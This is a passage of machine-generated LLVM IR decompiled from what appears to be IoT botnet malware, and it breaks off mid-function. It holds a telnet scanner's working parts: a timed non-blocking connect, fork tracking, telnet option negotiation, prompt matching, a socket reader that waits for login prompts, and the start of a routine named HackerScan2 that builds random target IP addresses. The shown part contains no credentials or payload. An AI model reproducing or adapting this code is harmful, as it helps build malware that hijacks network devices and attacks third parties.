define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg4, i32* @r3, align 4
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9df0 = load i32, i32* @fp, align 4
  store i32 %v3_9df0, i32* %stack_var_-16, align 4
  %v13_9df0 = ptrtoint i32* %stack_var_-16 to i32
  %v2_9e18 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_9e28 = or i32 %v2_9e18, 2048
  store i32 %v1_9e28, i32* @r3, align 4
  %v2_9e3c = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  store i32 2, i32* %stack_var_-48, align 4
  %v3_9e50 = urem i32 %arg3, 65536
  %v1_9e58 = call i32 @__GI_htons(i32 %v3_9e50)
  %v3_9e78 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-44)
  %v2_9e80 = icmp eq i32 %v3_9e78, 0
  br i1 %v2_9e80, label %dec_label_pc_9e94, label %dec_label_pc_9e88

dec_label_pc_9e88:                                ; preds = %entry
  br label %dec_label_pc_a04c

dec_label_pc_9e94:                                ; preds = %entry
  store i32 8, i32* @r2, align 4
  %v2_9ea8 = bitcast i32* %stack_var_-40 to i8*
  %v3_9ea8 = call i32 @__GI_memset(i8* %v2_9ea8, i32 0)
  %v2_9eac = ptrtoint i32* %stack_var_-48 to i32
  %v3_9ebc = call i32 @__libc_connect(i32 %arg1, i32 %v2_9eac, i32 16)
  store i32 %v3_9ebc, i32* @r3, align 4
  %v1_9ecc = icmp slt i32 %v3_9ebc, 0
  br i1 %v1_9ecc, label %dec_label_pc_9ed4, label %dec_label_pc_a010

dec_label_pc_9ed4:                                ; preds = %dec_label_pc_9e94
  %v0_9ed4 = call i32 @__GI___errno_location()
  %v1_9edc = inttoptr i32 %v0_9ed4 to i32*
  %v2_9edc = load i32, i32* %v1_9edc, align 4
  %v7_9ee0 = icmp eq i32 %v2_9edc, 115
  br i1 %v7_9ee0, label %dec_label_pc_9f0c.lr.ph, label %dec_label_pc_a004

dec_label_pc_9f0c.lr.ph:                          ; preds = %dec_label_pc_9ed4
  store i32 %arg4, i32* %stack_var_-184, align 4
  %v2_9ef8 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_9f0c

dec_label_pc_9f0c:                                ; preds = %dec_label_pc_9f0c.lr.ph, %dec_label_pc_9f0c
  %storemerge14 = phi i32 [ 0, %dec_label_pc_9f0c.lr.ph ], [ %v1_9f20, %dec_label_pc_9f0c ]
  %v5_9f18 = mul nuw nsw i32 %storemerge14, 4
  %v6_9f18 = add i32 %v5_9f18, %v2_9ef8
  %v7_9f18 = inttoptr i32 %v6_9f18 to i32*
  store i32 0, i32* %v7_9f18, align 4
  %v1_9f20 = add nuw nsw i32 %storemerge14, 1
  %tmp28 = icmp ult i32 %v1_9f20, 32
  br i1 %tmp28, label %dec_label_pc_9f0c, label %dec_label_pc_9f34

dec_label_pc_9f34:                                ; preds = %dec_label_pc_9f0c
  %v3_9f38 = udiv i32 %arg1, 32
  %v3_9f44 = mul nuw nsw i32 %v3_9f38, 4
  %v2_9f4c = add nsw i32 %v3_9f44, -160
  %v2_9f50 = add i32 %v2_9f4c, %v13_9df0
  %v1_9f54 = inttoptr i32 %v2_9f50 to i32*
  %v2_9f54 = load i32, i32* %v1_9f54, align 4
  %v1_9f5c = urem i32 %arg1, 32
  %v6_9f64 = shl i32 1, %v1_9f5c
  %v2_9f68 = or i32 %v2_9f54, %v6_9f64
  store i32 %v2_9f68, i32* %v1_9f54, align 4
  %v1_9f88 = add i32 %arg1, 1
  %v2_9f90 = ptrtoint i32* %stack_var_-184 to i32
  %v5_9fa8 = call i32 @__libc_select(i32 %v1_9f88, i32 0, i32 %v2_9ef8, i32 0, i32 %v2_9f90)
  %tmp29 = icmp slt i32 %v5_9fa8, 1
  br i1 %tmp29, label %dec_label_pc_9ff8, label %dec_label_pc_9fb8

dec_label_pc_9fb8:                                ; preds = %dec_label_pc_9f34
  store i32 4, i32* %stack_var_-188, align 4
  %v2_9fc0 = ptrtoint i32* %stack_var_-192 to i32
  %v2_9fc4 = ptrtoint i32* %stack_var_-188 to i32
  %v5_9fdc = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_9fc0, i32 %v2_9fc4)
  %v3_9fe0 = load i32, i32* %stack_var_-192, align 4
  store i32 %v3_9fe0, i32* @r3, align 4
  %v2_9fe4 = icmp eq i32 %v3_9fe0, 0
  br i1 %v2_9fe4, label %dec_label_pc_a010, label %dec_label_pc_9fec

dec_label_pc_9fec:                                ; preds = %dec_label_pc_9fb8
  br label %dec_label_pc_a04c

dec_label_pc_9ff8:                                ; preds = %dec_label_pc_9f34
  br label %dec_label_pc_a04c

dec_label_pc_a004:                                ; preds = %dec_label_pc_9ed4
  br label %dec_label_pc_a04c

dec_label_pc_a010:                                ; preds = %dec_label_pc_9e94, %dec_label_pc_9fb8
  %v2_a01c = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_a02c = and i32 %v2_a01c, -2049
  store i32 %v1_a02c, i32* @r3, align 4
  %v2_a040 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  br label %dec_label_pc_a04c

dec_label_pc_a04c:                                ; preds = %dec_label_pc_a004, %dec_label_pc_9ff8, %dec_label_pc_9fec, %dec_label_pc_9e88, %dec_label_pc_a010
  %stack_var_-212.0 = phi i32 [ 0, %dec_label_pc_9ff8 ], [ 1, %dec_label_pc_a010 ], [ 0, %dec_label_pc_9fec ], [ 0, %dec_label_pc_a004 ], [ 0, %dec_label_pc_9e88 ]
  ret i32 %stack_var_-212.0

; uselistorder directives
  uselistorder i32 %storemerge14, { 1, 0 }
  uselistorder i32 %v2_9ef8, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0, 6, 7, 8 }
  uselistorder label %dec_label_pc_a04c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_a010, { 1, 0 }
  uselistorder label %dec_label_pc_9f0c, { 1, 0 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v3_a064 = load i32, i32* @r4, align 4
  %v6_a064 = load i32, i32* @r5, align 4
  %v9_a064 = load i32, i32* @r6, align 4
  %v12_a064 = load i32, i32* @fp, align 4
  store i32 41068, i32* %stack_var_-4, align 4
  %v2_a068 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a068, i32* @fp, align 4
  %v0_a070 = call i32 @__libc_fork()
  %v2_a080 = icmp eq i32 %v0_a070, 0
  br i1 %v2_a080, label %dec_label_pc_a1ec, label %dec_label_pc_a094

dec_label_pc_a094:                                ; preds = %entry
  %v2_a098 = load i32, i32* @global_var_2e4e8.59, align 4
  %v5_a098 = load i32, i32* @global_var_2e4ec.60, align 4
  %v2_a0a4 = add i32 %v2_a098, 1
  %v3_a0a4 = icmp eq i32 %v2_a0a4, 0
  %v4_a0a8 = zext i1 %v3_a0a4 to i32
  %v5_a0a8 = add i32 %v4_a0a8, %v5_a098
  store i32 %v2_a0a4, i32* @global_var_2e4e8.59, align 4
  store i32 %v5_a0a8, i32* @global_var_2e4ec.60, align 4
  %v2_a0c4 = add i32 %v2_a098, 2
  %v3_a0c4 = icmp eq i32 %v2_a0a4, -1
  %v4_a0c8 = zext i1 %v3_a0c4 to i32
  %v5_a0c8 = add i32 %v5_a0a8, %v4_a0c8
  %v3_a0cc = udiv i32 %v2_a0c4, 1073741824
  %v3_a0d0 = mul i32 %v5_a0c8, 4
  %v2_a0d4 = or i32 %v3_a0d0, %v3_a0cc
  store i32 %v2_a0d4, i32* @r4, align 4
  %v3_a0d8 = mul i32 %v2_a0c4, 4
  %v1_a0e0 = call i32 @malloc(i32 %v3_a0d8)
  br label %dec_label_pc_a138

dec_label_pc_a0f8:                                ; preds = %dec_label_pc_a138, %dec_label_pc_a184
  %v3_a0fc = mul i32 %storemerge2, 4
  %v2_a108 = add i32 %v3_a0fc, %v1_a0e0
  %v2_a11c = load i32, i32* @global_var_34748.62, align 4
  %v2_a120 = add i32 %v2_a11c, %v3_a0fc
  %v1_a124 = inttoptr i32 %v2_a120 to i32*
  %v2_a124 = load i32, i32* %v1_a124, align 4
  %v2_a128 = inttoptr i32 %v2_a108 to i32*
  store i32 %v2_a124, i32* %v2_a128, align 4
  %v1_a130 = add i32 %storemerge2, 1
  br label %dec_label_pc_a138

dec_label_pc_a138:                                ; preds = %dec_label_pc_a094, %dec_label_pc_a0f8
  %storemerge2 = phi i32 [ 0, %dec_label_pc_a094 ], [ %v1_a130, %dec_label_pc_a0f8 ]
  %v2_a150 = load i32, i32* @global_var_2e4e8.59, align 4
  %v5_a150 = load i32, i32* @global_var_2e4ec.60, align 4
  %v2_a164 = add i32 %v2_a150, -1
  %v3_a164 = icmp ne i32 %v2_a150, 0
  %v3_a168 = add i32 %v5_a150, -1
  %v5_a168 = sext i1 %v3_a164 to i32
  %v9_a17c = icmp eq i32 %v3_a168, %v5_a168
  br i1 %v9_a17c, label %dec_label_pc_a184, label %dec_label_pc_a0f8

dec_label_pc_a184:                                ; preds = %dec_label_pc_a138
  store i32 %v2_a164, i32* @r5, align 4
  store i32 %storemerge2, i32* @r6, align 4
  %tmp = icmp ugt i32 %v2_a164, %storemerge2
  br i1 %tmp, label %dec_label_pc_a0f8, label %dec_label_pc_a1a4

dec_label_pc_a1a4:                                ; preds = %dec_label_pc_a184
  store i32 %v5_a150, i32* @r4, align 4
  %v3_a1ac = mul i32 %v2_a150, 4
  %v1_a1b0 = add i32 %v1_a0e0, -4
  %v2_a1bc = add i32 %v1_a1b0, %v3_a1ac
  %v2_a1c4 = inttoptr i32 %v2_a1bc to i32*
  store i32 %v0_a070, i32* %v2_a1c4, align 4
  %v2_a1cc = load i32, i32* @global_var_34748.62, align 4
  store i32 %v2_a1cc, i32* @r0, align 4
  %v0_a1d4 = call i32 @free()
  store i32 ptrtoint (i32* @global_var_34748.62 to i32), i32* @r2, align 4
  store i32 %v1_a0e0, i32* @global_var_34748.62, align 4
  br label %dec_label_pc_a1ec

dec_label_pc_a1ec:                                ; preds = %entry, %dec_label_pc_a1a4
  store i32 %v3_a064, i32* @r4, align 4
  store i32 %v6_a064, i32* @r5, align 4
  store i32 %v9_a064, i32* @r6, align 4
  store i32 %v12_a064, i32* @fp, align 4
  ret i32 %v0_a070

; uselistorder directives
  uselistorder i32 %storemerge2, { 0, 2, 1, 3 }
  uselistorder i32 %v3_a0fc, { 1, 0 }
  uselistorder i32 %v1_a0e0, { 2, 0, 1 }
  uselistorder i32 %v2_a0a4, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_a1ec, { 1, 0 }
  uselistorder label %dec_label_pc_a138, { 1, 0 }
  uselistorder label %dec_label_pc_a0f8, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v1_a228 = add i32 %arg2, 1
  %v1_a22c = inttoptr i32 %v1_a228 to i8*
  %v2_a22c = load i8, i8* %v1_a22c, align 1
  %v7_a238 = icmp ult i8 %v2_a22c, -5
  br i1 %v7_a238, label %dec_label_pc_a384, label %dec_label_pc_a240

dec_label_pc_a240:                                ; preds = %entry
  %v7_a248 = icmp eq i8 %v2_a22c, -1
  br i1 %v7_a248, label %dec_label_pc_a24c, label %dec_label_pc_a268

dec_label_pc_a24c:                                ; preds = %dec_label_pc_a240
  br label %dec_label_pc_a384

dec_label_pc_a268:                                ; preds = %dec_label_pc_a240
  store i8 -1, i8* %stack_var_-17, align 1
  %v2_a270 = ptrtoint i8* %stack_var_-17 to i32
  %v5_a284 = call i32 @__libc_send(i32 %arg1, i32 %v2_a270, i32 1, i32 16384)
  %v2_a290 = load i8, i8* %v1_a22c, align 1
  %v7_a294 = icmp eq i8 %v2_a290, -4
  br i1 %v7_a294, label %dec_label_pc_a29c, label %dec_label_pc_a2a8

dec_label_pc_a29c:                                ; preds = %dec_label_pc_a268
  store i8 -2, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a348

dec_label_pc_a2a8:                                ; preds = %dec_label_pc_a268
  %v2_a2b0 = load i8, i8* %v1_a22c, align 1
  %v7_a2b4 = icmp eq i8 %v2_a2b0, -2
  br i1 %v7_a2b4, label %dec_label_pc_a2bc, label %dec_label_pc_a2c8

dec_label_pc_a2bc:                                ; preds = %dec_label_pc_a2a8
  store i8 -4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a348

dec_label_pc_a2c8:                                ; preds = %dec_label_pc_a2a8
  %v2_a2d0 = load i8, i8* %v1_a22c, align 1
  %v7_a2d4 = icmp eq i8 %v2_a2d0, 3
  %v7_a2e8 = icmp eq i8 %v2_a2d0, -3
  br i1 %v7_a2d4, label %dec_label_pc_a2dc, label %dec_label_pc_a314

dec_label_pc_a2dc:                                ; preds = %dec_label_pc_a2c8
  br i1 %v7_a2e8, label %dec_label_pc_a2f0, label %dec_label_pc_a2fc

dec_label_pc_a2f0:                                ; preds = %dec_label_pc_a2dc
  br label %dec_label_pc_a304

dec_label_pc_a2fc:                                ; preds = %dec_label_pc_a2dc
  br label %dec_label_pc_a304

dec_label_pc_a304:                                ; preds = %dec_label_pc_a2f0, %dec_label_pc_a2fc
  %storemerge = phi i8 [ -3, %dec_label_pc_a2fc ], [ -5, %dec_label_pc_a2f0 ]
  store i8 %storemerge, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a348

dec_label_pc_a314:                                ; preds = %dec_label_pc_a2c8
  br i1 %v7_a2e8, label %dec_label_pc_a328, label %dec_label_pc_a334

dec_label_pc_a328:                                ; preds = %dec_label_pc_a314
  br label %dec_label_pc_a33c

dec_label_pc_a334:                                ; preds = %dec_label_pc_a314
  br label %dec_label_pc_a33c

dec_label_pc_a33c:                                ; preds = %dec_label_pc_a328, %dec_label_pc_a334
  %storemerge4 = phi i8 [ -2, %dec_label_pc_a334 ], [ -4, %dec_label_pc_a328 ]
  store i8 %storemerge4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a348

dec_label_pc_a348:                                ; preds = %dec_label_pc_a304, %dec_label_pc_a2bc, %dec_label_pc_a29c, %dec_label_pc_a33c
  %v4_a35c = call i32 @__libc_send(i32 %arg1, i32 %v2_a270, i32 1, i32 16384)
  %v1_a364 = add i32 %arg2, 2
  %v4_a378 = call i32 @__libc_send(i32 %arg1, i32 %v1_a364, i32 1, i32 16384)
  br label %dec_label_pc_a384

dec_label_pc_a384:                                ; preds = %dec_label_pc_a24c, %dec_label_pc_a348, %entry
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-17, { 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_a384, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a348, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_a33c, { 1, 0 }
  uselistorder label %dec_label_pc_a304, { 1, 0 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_a3b8 = call i32 @strlen(i8* %arg1)
  %v2_a400 = add i32 %v3_a3b8, %tmp
  br label %dec_label_pc_a4d4

dec_label_pc_a3d8:                                ; preds = %dec_label_pc_a460, %dec_label_pc_a43c, %dec_label_pc_a418, %dec_label_pc_a3f4
  %v1_a3dc = add nsw i32 %stack_var_-28.013, 1
  %v7_a3f0 = icmp sgt i32 %v3_a3b8, %v1_a3dc
  br i1 %v7_a3f0, label %dec_label_pc_a3f4, label %dec_label_pc_a484

dec_label_pc_a3f4:                                ; preds = %dec_label_pc_a3e4.preheader, %dec_label_pc_a3d8
  %stack_var_-28.013 = phi i32 [ %v1_a3dc, %dec_label_pc_a3d8 ], [ %stack_var_-28.1, %dec_label_pc_a3e4.preheader ]
  %v2_a408 = sub i32 %v2_a400, %stack_var_-28.013
  %v1_a40c = inttoptr i32 %v2_a408 to i8*
  %v2_a40c = load i8, i8* %v1_a40c, align 1
  %v2_a410 = icmp eq i8 %v2_a40c, 0
  br i1 %v2_a410, label %dec_label_pc_a3d8, label %dec_label_pc_a418

dec_label_pc_a418:                                ; preds = %dec_label_pc_a3f4
  %v2_a430 = load i8, i8* %v1_a40c, align 1
  %v7_a434 = icmp eq i8 %v2_a430, 32
  br i1 %v7_a434, label %dec_label_pc_a3d8, label %dec_label_pc_a43c

dec_label_pc_a43c:                                ; preds = %dec_label_pc_a418
  %v2_a454 = load i8, i8* %v1_a40c, align 1
  %v7_a458 = icmp eq i8 %v2_a454, 13
  br i1 %v7_a458, label %dec_label_pc_a3d8, label %dec_label_pc_a460

dec_label_pc_a460:                                ; preds = %dec_label_pc_a43c
  %v2_a478 = load i8, i8* %v1_a40c, align 1
  %v7_a47c = icmp eq i8 %v2_a478, 10
  br i1 %v7_a47c, label %dec_label_pc_a3d8, label %dec_label_pc_a484

dec_label_pc_a484:                                ; preds = %dec_label_pc_a460, %dec_label_pc_a3d8, %dec_label_pc_a3e4.preheader
  %stack_var_-28.0.lcssa = phi i32 [ %stack_var_-28.1, %dec_label_pc_a3e4.preheader ], [ %stack_var_-28.013, %dec_label_pc_a460 ], [ %v1_a3dc, %dec_label_pc_a3d8 ]
  %v2_a498 = sub i32 %v2_a400, %stack_var_-28.0.lcssa
  %v1_a49c = inttoptr i32 %v2_a498 to i8*
  %v2_a49c = load i8, i8* %v1_a49c, align 1
  %v2_a4ac = add i32 %storemerge2, ptrtoint ([6 x i8]* @global_var_1ffe8.64 to i32)
  %v1_a4b0 = inttoptr i32 %v2_a4ac to i8*
  %v2_a4b0 = load i8, i8* %v1_a4b0, align 1
  %v9_a4b4 = icmp eq i8 %v2_a49c, %v2_a4b0
  %v1_a4cc = add i32 %storemerge2, 1
  br i1 %v9_a4b4, label %dec_label_pc_a4f4, label %dec_label_pc_a4d4

dec_label_pc_a4d4:                                ; preds = %dec_label_pc_a484, %entry
  %stack_var_-28.1 = phi i32 [ 0, %entry ], [ %stack_var_-28.0.lcssa, %dec_label_pc_a484 ]
  %storemerge2 = phi i32 [ 0, %entry ], [ %v1_a4cc, %dec_label_pc_a484 ]
  %v3_a4dc = call i32 @strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ffe8.64, i32 0, i32 0))
  %v3_a4e4 = icmp ult i32 %storemerge2, %v3_a4dc
  br i1 %v3_a4e4, label %dec_label_pc_a3e4.preheader, label %dec_label_pc_a4f4

dec_label_pc_a3e4.preheader:                      ; preds = %dec_label_pc_a4d4
  %v7_a3f012 = icmp sgt i32 %v3_a3b8, %stack_var_-28.1
  br i1 %v7_a3f012, label %dec_label_pc_a3f4, label %dec_label_pc_a484

dec_label_pc_a4f4:                                ; preds = %dec_label_pc_a4d4, %dec_label_pc_a484
  %storemerge3 = phi i32 [ 1, %dec_label_pc_a484 ], [ 0, %dec_label_pc_a4d4 ]
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %stack_var_-28.1, { 2, 0, 1 }
  uselistorder i32 %stack_var_-28.0.lcssa, { 1, 0 }
  uselistorder i32 %v3_a3b8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a484, { 2, 0, 1 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_a510 = load i32, i32* @fp, align 4
  store i32 %v3_a510, i32* %stack_var_-16, align 4
  %v13_a510 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_a560 = ptrtoint i32* %stack_var_-168 to i32
  %v3_a5a0 = udiv i32 %arg1, 32
  %v3_a5ac = mul nuw nsw i32 %v3_a5a0, 4
  %v1_a5c4 = urem i32 %arg1, 32
  %v6_a5cc = shl i32 1, %v1_a5c4
  %v1_a5f0 = add i32 %arg1, 1
  %v2_a5f8 = ptrtoint i32* %stack_var_-176 to i32
  %v6_a718 = inttoptr i32 %arg2 to i8*
  %v2_a72c = icmp eq i32 %arg3, 0
  %v1_a738 = inttoptr i32 %arg6 to i8*
  %v5_a77c = icmp sgt i32 %arg5, 0
  %v2_a5b4 = add nsw i32 %v3_a5ac, -152
  %v2_a5b8 = add i32 %v2_a5b4, %v13_a510
  %v1_a5bc = inttoptr i32 %v2_a5b8 to i32*
  br label %dec_label_pc_a754

dec_label_pc_a574.lr.ph:                          ; preds = %dec_label_pc_a768, %dec_label_pc_a774
  br label %dec_label_pc_a574

dec_label_pc_a574:                                ; preds = %dec_label_pc_a574.lr.ph, %dec_label_pc_a574
  %storemerge27 = phi i32 [ 0, %dec_label_pc_a574.lr.ph ], [ %v1_a588, %dec_label_pc_a574 ]
  %v5_a580 = mul nuw nsw i32 %storemerge27, 4
  %v6_a580 = add i32 %v5_a580, %v2_a560
  %v7_a580 = inttoptr i32 %v6_a580 to i32*
  store i32 0, i32* %v7_a580, align 4
  %v1_a588 = add nuw nsw i32 %storemerge27, 1
  %tmp30 = icmp ult i32 %v1_a588, 32
  br i1 %tmp30, label %dec_label_pc_a574, label %dec_label_pc_a59c

dec_label_pc_a59c:                                ; preds = %dec_label_pc_a574
  %v2_a5bc = load i32, i32* %v1_a5bc, align 4
  %v2_a5d0 = or i32 %v2_a5bc, %v6_a5cc
  store i32 %v2_a5d0, i32* %v1_a5bc, align 4
  %v5_a60c = call i32 @__libc_select(i32 %v1_a5f0, i32 %v2_a560, i32 0, i32 0, i32 %v2_a5f8)
  %tmp31 = icmp slt i32 %v5_a60c, 1
  br i1 %tmp31, label %dec_label_pc_a798, label %dec_label_pc_a61c

dec_label_pc_a61c:                                ; preds = %dec_label_pc_a59c
  %v2_a628 = add i32 %stack_var_-40.0, %arg6
  %v5_a62c = inttoptr i32 %v2_a628 to i8*
  %v6_a640 = call i32 @__libc_recv(i32 %arg1, i32 %v2_a628, i32 1, i32 0, i32 %v2_a628)
  %v7_a650 = icmp eq i32 %v6_a640, -1
  br i1 %v7_a650, label %dec_label_pc_a664, label %dec_label_pc_a658

dec_label_pc_a658:                                ; preds = %dec_label_pc_a61c
  %v2_a65c = icmp eq i32 %v6_a640, 0
  br i1 %v2_a65c, label %dec_label_pc_a664, label %dec_label_pc_a670

dec_label_pc_a664:                                ; preds = %dec_label_pc_a658, %dec_label_pc_a61c
  br label %dec_label_pc_a7a0

dec_label_pc_a670:                                ; preds = %dec_label_pc_a658
  %v2_a678 = add i32 %v6_a640, %stack_var_-40.0
  %v2_a684 = load i8, i8* %v5_a62c, align 1
  %v2_a688 = icmp eq i8 %v2_a684, -1
  br i1 %v2_a688, label %dec_label_pc_a690, label %dec_label_pc_a710

dec_label_pc_a690:                                ; preds = %dec_label_pc_a670
  %v1_a694 = add i32 %v2_a628, 1
  %v5_a6a8 = call i32 @__libc_recv(i32 %arg1, i32 %v1_a694, i32 2, i32 0, i32 %v2_a678)
  %v7_a6b8 = icmp eq i32 %v5_a6a8, -1
  br i1 %v7_a6b8, label %dec_label_pc_a6cc, label %dec_label_pc_a6c0

dec_label_pc_a6c0:                                ; preds = %dec_label_pc_a690
  %v2_a6c4 = icmp eq i32 %v5_a6a8, 0
  br i1 %v2_a6c4, label %dec_label_pc_a6cc, label %dec_label_pc_a6d8

dec_label_pc_a6cc:                                ; preds = %dec_label_pc_a6c0, %dec_label_pc_a690
  br label %dec_label_pc_a7a0

dec_label_pc_a6d8:                                ; preds = %dec_label_pc_a6c0
  %v2_a6e0 = add i32 %v5_a6a8, %v2_a678
  %v3_a6f4 = call i32 @negotiate(i32 %arg1, i32 %v2_a628, i32 3)
  %v2_a6fc = icmp eq i32 %v3_a6f4, 0
  br i1 %v2_a6fc, label %dec_label_pc_a704, label %dec_label_pc_a754

dec_label_pc_a704:                                ; preds = %dec_label_pc_a6d8
  br label %dec_label_pc_a7a0

dec_label_pc_a710:                                ; preds = %dec_label_pc_a670
  %v7_a718 = call i32 @strstr(i32 %arg6, i8* %v6_a718)
  %v2_a720 = icmp eq i32 %v7_a718, 0
  br i1 %v2_a720, label %dec_label_pc_a728, label %dec_label_pc_a78c

dec_label_pc_a728:                                ; preds = %dec_label_pc_a710
  br i1 %v2_a72c, label %dec_label_pc_a754, label %dec_label_pc_a734

dec_label_pc_a734:                                ; preds = %dec_label_pc_a728
  %v2_a738 = call i32 @matchPrompt(i8* %v1_a738)
  %v2_a740 = icmp eq i32 %v2_a738, 0
  br i1 %v2_a740, label %dec_label_pc_a754, label %dec_label_pc_a78c

dec_label_pc_a754:                                ; preds = %dec_label_pc_a6d8, %dec_label_pc_a734, %dec_label_pc_a728, %entry
  %stack_var_-40.0 = phi i32 [ %arg8, %entry ], [ %v2_a6e0, %dec_label_pc_a6d8 ], [ %v2_a678, %dec_label_pc_a728 ], [ %v2_a678, %dec_label_pc_a734 ]
  %v1_a758 = add i32 %stack_var_-40.0, 2
  %v6_a764 = icmp slt i32 %v1_a758, %arg7
  br i1 %v6_a764, label %dec_label_pc_a768, label %dec_label_pc_a798

dec_label_pc_a768:                                ; preds = %dec_label_pc_a754
  %v3_a768 = load i32, i32* %stack_var_-176, align 4
  %v5_a770 = icmp sgt i32 %v3_a768, 0
  br i1 %v5_a770, label %dec_label_pc_a574.lr.ph, label %dec_label_pc_a774

dec_label_pc_a774:                                ; preds = %dec_label_pc_a768
  br i1 %v5_a77c, label %dec_label_pc_a574.lr.ph, label %dec_label_pc_a798

dec_label_pc_a78c:                                ; preds = %dec_label_pc_a710, %dec_label_pc_a734
  br label %dec_label_pc_a7a0

dec_label_pc_a798:                                ; preds = %dec_label_pc_a59c, %dec_label_pc_a774, %dec_label_pc_a754
  br label %dec_label_pc_a7a0

dec_label_pc_a7a0:                                ; preds = %dec_label_pc_a78c, %dec_label_pc_a704, %dec_label_pc_a6cc, %dec_label_pc_a664, %dec_label_pc_a798
  %stack_var_-196.0 = phi i32 [ 0, %dec_label_pc_a798 ], [ 1, %dec_label_pc_a78c ], [ 0, %dec_label_pc_a664 ], [ 0, %dec_label_pc_a6cc ], [ 0, %dec_label_pc_a704 ]
  ret i32 %stack_var_-196.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 2, 1, 0 }
  uselistorder i32 %v5_a6a8, { 1, 2, 0 }
  uselistorder i32 %v6_a640, { 1, 2, 0 }
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v2_a560, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_a7a0, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_a798, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a78c, { 1, 0 }
  uselistorder label %dec_label_pc_a754, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_a574, { 1, 0 }
  uselistorder label %dec_label_pc_a574.lr.ph, { 1, 0 }
}

define i32 @HackerScan2(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_a7b8 = load i32, i32* @fp, align 4
  store i32 42944, i32* %stack_var_-4, align 4
  %v2_a7bc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a7bc, i32* @fp, align 4
  store i8 0, i8* @global_var_2e4f7.67, align 1
  store i8 0, i8* @global_var_2e4f8.68, align 1
  store i8 0, i8* @global_var_2e4f9.69, align 1
  store i8 0, i8* @global_var_2e4fa.70, align 1
  %v0_a7f4 = call i32 @rand()
  %v2_a810 = sdiv i32 %v0_a7f4, 51
  %tmp219 = mul i32 %v2_a810, -255
  %v2_a828 = add i32 %tmp219, %v0_a7f4
  %v1_a83c = trunc i32 %v2_a828 to i8
  store i8 %v1_a83c, i8* @global_var_2e4f7.67, align 1
  %v0_a840 = call i32 @rand()
  %v2_a85c = sdiv i32 %v0_a840, 51
  %tmp220 = mul i32 %v2_a85c, -255
  %v2_a874 = add i32 %tmp220, %v0_a840
  %v1_a888 = trunc i32 %v2_a874 to i8
  store i8 %v1_a888, i8* @global_var_2e4f8.68, align 1
  %v0_a88c = call i32 @rand()
  %v2_a8a8 = sdiv i32 %v0_a88c, 51
  %tmp221 = mul i32 %v2_a8a8, -255
  %v2_a8c0 = add i32 %tmp221, %v0_a88c
  %v1_a8d4 = trunc i32 %v2_a8c0 to i8
  store i8 %v1_a8d4, i8* @global_var_2e4f9.69, align 1
  %v0_a8d8 = call i32 @rand()
  %v2_a8f4 = sdiv i32 %v0_a8d8, 51
  %tmp222 = mul i32 %v2_a8f4, -255
  %v2_a90c = add i32 %tmp222, %v0_a8d8
  %v1_a920 = trunc i32 %v2_a90c to i8
  store i8 %v1_a920, i8* @global_var_2e4fa.70, align 1
  %v0_a924 = call i32 @rand()
  %v2_a93c = srem i32 %v0_a924, 208
  %v2_a964 = icmp eq i32 %v2_a93c, 0
